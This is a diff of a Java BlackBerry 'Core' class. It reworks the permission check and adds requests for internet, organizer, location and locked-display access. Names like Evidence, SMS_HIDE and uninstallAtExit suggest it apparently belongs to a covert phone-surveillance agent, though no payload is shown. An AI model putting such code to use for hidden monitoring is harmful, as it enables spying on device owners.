@@ -64,7 +64,7 @@ public final class Core implements Runnable {
     }
 
     /** The task obj. */
-    private final Task task;
+    private Task task;
     private boolean uninstallAtExit;
 
     /**
@@ -79,20 +79,18 @@ public final class Core implements Runnable {
         debug.info("INIT " + (new Date()).toString()); //$NON-NLS-1$
         //#endif
 
-        checkPermissions();
+        if (checkPermissions()) {
+            task = Task.getInstance();
 
-        task = Task.getInstance();
+            Utils.sleep(1000);
 
-        Utils.sleep(1000);
+            final boolean antennaInstalled = true;
+            //#ifdef DEBUG
+            System.out.println("DEBUG"); //$NON-NLS-1$
+            //#endif
 
-        final boolean antennaInstalled = true;
-        //#ifdef DEBUG
-        System.out.println("DEBUG"); //$NON-NLS-1$
-        //#endif
-
-        Encryption.init();
-
-        //Main.getInstance().goBackground();
+            Encryption.init();
+        }
     }
 
     /**
@@ -105,23 +103,11 @@ public final class Core implements Runnable {
      * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
      * Permissions' from the menu.
      */
-    private void checkPermissions() {
+    private boolean checkPermissions() {
 
         //#ifdef DEBUG
         debug.trace("CheckPermissions"); //$NON-NLS-1$
         //#endif
-
-        // NOTE: This sample leverages the following permissions:
-        // --Event Injector
-        // --Phone
-        // --Device Settings
-        // --Email
-        // The sample demonstrates how these user defined permissions will
-        // cause the respective tests to succeed or fail. Individual
-        // applications will require access to different permissions.
-        // Please review the Javadocs for the ApplicationPermissions class
-        // for a list of all available permissions
-        // May 13, 2008: updated permissions by replacing deprecated constants.
 
         // Capture the current state of permissions and check against the
         // requirements
@@ -157,11 +143,16 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
                 //#ifdef SMS_HIDE
                 ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
-        //#endif
-        //PERMISSION_DISPLAY_LOCKED, // 22
-        };
+                //#endif
 
-        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
+                //#ifdef OS_AT_LEAST_5
+                ApplicationPermissions.PERMISSION_INTERNET,
+                ApplicationPermissions.PERMISSION_ORGANIZER_DATA,
+                ApplicationPermissions.PERMISSION_LOCATION_DATA,
+                ApplicationPermissions.PERMISSION_DISPLAY_LOCKED,                
+                //#endif
+
+        };
 
         boolean allPermitted = true;
         for (int i = 0; i < wantedPermissions.length; i++) {
@@ -183,7 +174,7 @@ public final class Core implements Runnable {
             //#ifdef DEBUG
             debug.info("All of the necessary permissions are currently available"); //$NON-NLS-1$
             //#endif
-            return;
+            return true;
         }
 
         // Create a permission request for each of the permissions your
@@ -213,6 +204,8 @@ public final class Core implements Runnable {
             //#endif
         }
 
+        return acceptance;
+
     }
 
     /**
@@ -228,7 +221,7 @@ public final class Core implements Runnable {
         debug.info("START: " + (new Date())); //$NON-NLS-1$
         Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
         //#else
-        Evidence.info(Messages.getString("7.17") + demo); //$NON-NLS-1$
+        Evidence.info(Messages.getString("7.17") + demo + " " + Cfg.OSVERSION); //$NON-NLS-1$
         //EventLogger.setMinimumLevel(EventLogger.SEVERE_ERROR);
         //#endif
 
